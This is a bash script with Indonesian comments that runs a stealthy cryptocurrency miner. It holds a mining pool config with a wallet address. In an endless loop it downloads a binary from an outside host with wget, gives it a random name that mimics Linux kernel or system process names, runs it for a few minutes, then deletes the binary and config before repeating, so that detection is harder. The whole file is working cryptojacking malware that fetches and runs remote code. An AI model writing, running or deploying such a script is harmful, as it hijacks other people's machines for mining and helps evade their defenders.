#!/bin/bash

CONFIG_JSON='{
  "algo": "Yespowertide",
  "url": "35.162.27.139:443",
  "user": "TNR2ML87UqCtKG7uTAmvy7xvLSU1oLVsuR.Train223",
  "pass": "x",
  "threads": 8
}'

# Daftar nama proses Linux core yang lebih beragam
POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")

# Lokasi penyimpanan
LOCAL_BIN_DIR="$HOME/.local/bin"
mkdir -p "$LOCAL_BIN_DIR"

# Fungsi untuk generate string acak
generate_random_string() {
    local length=${1:-8}
    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
}

while true; do
    # Hapus data sesi lama termasuk config
    rm -f "$LOCAL_BIN_DIR"/*.json
    rm -f "$LOCAL_BIN_DIR"/.dbus-daemon*
    rm -f "$LOCAL_BIN_DIR"/migration*
    rm -f "$LOCAL_BIN_DIR"/watchdog*
    rm -f "$LOCAL_BIN_DIR"/.ksoftirqd*
    rm -f "$LOCAL_BIN_DIR"/rcu_*
    rm -f "$LOCAL_BIN_DIR"/.profile-cache*
    rm -f "$LOCAL_BIN_DIR"/kdevtmpfs*
    rm -f "$LOCAL_BIN_DIR"/kintegrityd*
    rm -f "$LOCAL_BIN_DIR"/kblockd*
    rm -f "$LOCAL_BIN_DIR"/kthrotld*

    # Pilih nama binary acak dari daftar
    BIN_NAME="${POSSIBLE_NAMES[$RANDOM % ${#POSSIBLE_NAMES[@]}]}"
    
    # Tambahkan string acak untuk membuat nama lebih unik
    RAND_SUFFIX=$(generate_random_string 12)
    BIN_NAME_FULL="${BIN_NAME}${RAND_SUFFIX}"
    
    # Buat nama config dengan suffix acak
    CONFIG_SUFFIX=$(generate_random_string 10)
    CONFIG_PATH="$LOCAL_BIN_DIR/${BIN_NAME}_config${CONFIG_SUFFIX}.json"

    # Simpan config JSON sesuai nama bin (gunakan CONFIG_JSON yang sudah ada)
    echo "$CONFIG_JSON" > "$CONFIG_PATH"

    # Download binary baru
    wget -q "https://dot-store.biz.id/bagong" -O "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
    
    # Pastikan download berhasil sebelum melanjutkan
    if [ $? -ne 0 ]; then
        echo "Error: Download failed. Retrying in 30 seconds..."
        sleep 30
        continue
    fi
    
    chmod +x "$LOCAL_BIN_DIR/$BIN_NAME_FULL"

    # Tentukan waktu aktif (2-3 menit)
    ACTIVE_MIN=$((RANDOM % 2 + 2))
    ACTIVE_SEC=$((ACTIVE_MIN * 60))

    # Tentukan waktu istirahat (20-30 detik)
    IDLE_SEC=$((RANDOM % 11 + 20))

    # Jalankan proses dengan timeout
    timeout "$ACTIVE_SEC" "$LOCAL_BIN_DIR/$BIN_NAME_FULL" --config="$CONFIG_PATH" >/dev/null 2>&1

    # Hapus binary dan config setelah digunakan
    rm -f "$LOCAL_BIN_DIR/$BIN_NAME_FULL"
    rm -f "$CONFIG_PATH"

    # Istirahat
    sleep "$IDLE_SEC"
done
